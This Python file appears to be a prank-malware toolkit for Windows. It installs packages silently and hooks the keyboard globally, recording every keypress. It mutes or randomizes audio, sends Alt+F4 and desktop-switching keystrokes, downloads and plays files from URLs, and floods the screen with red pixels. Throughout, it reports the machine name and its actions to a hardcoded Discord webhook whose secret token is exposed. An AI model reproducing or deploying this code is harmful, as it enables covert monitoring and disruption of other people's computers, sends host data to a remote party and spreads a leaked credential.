from random import randint
import math
from time import sleep
import os.path
import os
import pip
from threading import Thread
from time import sleep
from random import randint

webhook_link = "https://discord.com/api/webhooks/1184525775400095744/-rQXhzo5YQDm8-K4GQVXbz32C9NMj0ykOOxvmJz1bTXjeuMI0_bsHF15UJGSDMAuOgeO"

def install(package):
    if hasattr(pip, 'main'):
        pip.main(['install', package])
    else:
        pip._internal.main(['install', package])

try:
    import requests
except:
    install("requests")
    import requests

username = os.environ['COMPUTERNAME']

def log(msg):
    # content = ""
    # try:
    #     with open("logs.txt","r") as f:
    #         content = f.read()
    # except:
    #     pass
    # if content != "":
    #     content += "\n"
    # with open("logs.txt","w") as f:
    #     f.write(content + msg)
    print(msg)
    data = {"content" : f"``{msg}``","username" : username}
    r = requests.post(webhook_link,json=data)

log("Loading requierements")

try:
    from pynput.keyboard import Key, Controller, Listener
except:
    try:
        install("pynput")
        from pynput.keyboard import Key, Controller, Listener
    except:
        log("Can't load 'pynput' module")

try:  
    from win32api import GetSystemMetrics
    import win32gui
except:
    try:
        install("pywin32")
        from win32api import GetSystemMetrics
        import win32gui
    except:
        log("Can't load 'pywin32' module")

try:
    from ctypes import cast, POINTER
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except:
    try:
        install("pycaw")
        from ctypes import cast, POINTER
        from comtypes import CLSCTX_ALL
        from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
        import math
    except:
        log("Can't load 'pycaw' module")

try:
    os.add_dll_directory(r"C:\Program Files\VideoLAN\VLC")
except:
    pass
try:
    os.add_dll_directory(r"C:\Program Files (x86)\VideoLAN\VLC")
except:
    pass

try:
    from vlc import MediaPlayer as playsoundfromdisk
except:
    try:
        install("python-vlc")
        from vlc import MediaPlayer as playsoundfromdisk
    except:
        log("Can't load 'python-vlc' module")

try:
    from webbrowser import open as webopen
except:
    try:
        install("webbrowser")
        from webbrowser import open as webopen
    except:
        log("Can't load 'webbrowser' module")

last_keys = []
keypress_event = []

def startswithlist(list1,list2):
    return list1[:len(list2)] == list2

actions = []

def on_press(key):
    try:
        if type(key) != type(Key.alt):
            key = str(key).replace("'","")
        last_keys.insert(0,key)
        for x in keypress_event :
            if startswithlist(last_keys,x[0]):        
                actions.append(x[1])

    except Exception as E:
        log(f"Error {E} on_press({key})")

def add_key_press_event(keys: dict, func: str):
    try:
        keypress_event.append([keys,func])
        log(f"Sucessfuly add_key_press_event({keys},{func})")
    except Exception as E:
        log(f"Error {E} while trying to add_key_press_event({keys},{func})")

listener = Listener(on_press=on_press)
listener.start()

def unmute():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(0, None)
        log("Sucessfuly unmute")
    except Exception as E:
        log(f"Error {E} while trying to unmute")

def mute():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        volume.SetMute(1, None)
        log("Sucessfuly mute")
    except Exception as E:
        log(f"Error {E} while trying to mute")

def set_random_volume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        # Get current volume 
        currentVolumeDb = volume.GetMasterVolumeLevel()
        randint(0,1)
        volume.SetMasterVolumeLevel(randint(-30,0), None)
        log("Sucessfuly set_random_volume")
    except Exception as E:
        log(f"Error {E} while trying to set_random_volume")

def alt_f4():
    try:
        keyboard = Controller()
        keyboard.press(Key.alt)
        keyboard.press(Key.f4)
        keyboard.release(Key.alt)
        keyboard.release(Key.f4)
        log("Sucessfuly alt_f4")
    except Exception as E:
        log(f"Error {E} while trying to alt_f4")

def win_d():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press("d")
        keyboard.release(Key.cmd)
        keyboard.release("d")
        log("Sucessfuly win_d")
    except Exception as E:
        log(f"Error {E} while trying to win_d")

def ctrl_win_d():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press("d")
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release("d")
        log("Sucessfuly ctrl_win_d")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_d")

def ctrl_win_right():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press(Key.right)
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release(Key.right)
        log("Sucessfuly ctrl_win_right")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_right")

def ctrl_win_left():
    try:
        keyboard = Controller()
        keyboard.press(Key.cmd)
        keyboard.press(Key.ctrl)
        keyboard.press(Key.left)
        keyboard.release(Key.cmd)
        keyboard.release(Key.ctrl)
        keyboard.release(Key.left)
        log("Sucessfuly ctrl_win_left")
    except Exception as E:
        log(f"Error {E} while trying to ctrl_win_left")

def download_file(url):
    local_filename = url.split('/')[-1]
    # NOTE the stream=True parameter below
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open(local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                # If you have chunk encoded response uncomment if
                # and set chunk_size parameter to None.
                #if chunk: 
                f.write(chunk)
    return local_filename

def playsound(url):
    try:
        name = url.split('/')[-1]
        check_file = os.path.isfile(name)
        if check_file == False:
            download_file(url)
        playsoundfromdisk(name).play()
        log(f"Sucessfuly playsound({url})")
    except Exception as E:
        log(f"Error {E} while trying to playsound({url})")

def set_varicelle_on_screen():
    try:
        global varicelle_statu,varicelle_delay,varicelle_color
        lx=GetSystemMetrics (0)-1
        ly=GetSystemMetrics (1)-1
        color = varicelle_color
        while True:
            if varicelle_statu == True:
                hdc = win32gui.GetDC(0)
                for i in range(1000):
                    win32gui.SetPixel(hdc, randint(1,lx), randint(1,ly), color)
                win32gui.ReleaseDC(0, hdc)
                sleep(varicelle_delay)
    except Exception as E:
        log(f"Error {E} on set_varicelle_on_screen()")


varicelle_statu = False
varicelle_delay = 0.1
varicelle_color = 0xFF0000

def varicelle(instruction,delay=varicelle_delay,color=varicelle_color):
    try:
        global varicelle_statu,varicelle_delay,varicelle_color
        varicelle_delay = delay
        varicelle_color = color
        if instruction == "toogle":
            varicelle_statu = varicelle_statu == False
        elif instruction in [True,False]:
            varicelle_statu = instruction
        log(f"Sucessfuly executed varicelle({instruction},{delay},{color}")
    except Exception as E:
        log(f"Error {E} on varicelle({instruction},{delay},{color})")

thread = Thread(target=set_varicelle_on_screen)
thread.start()


log("Import finished")
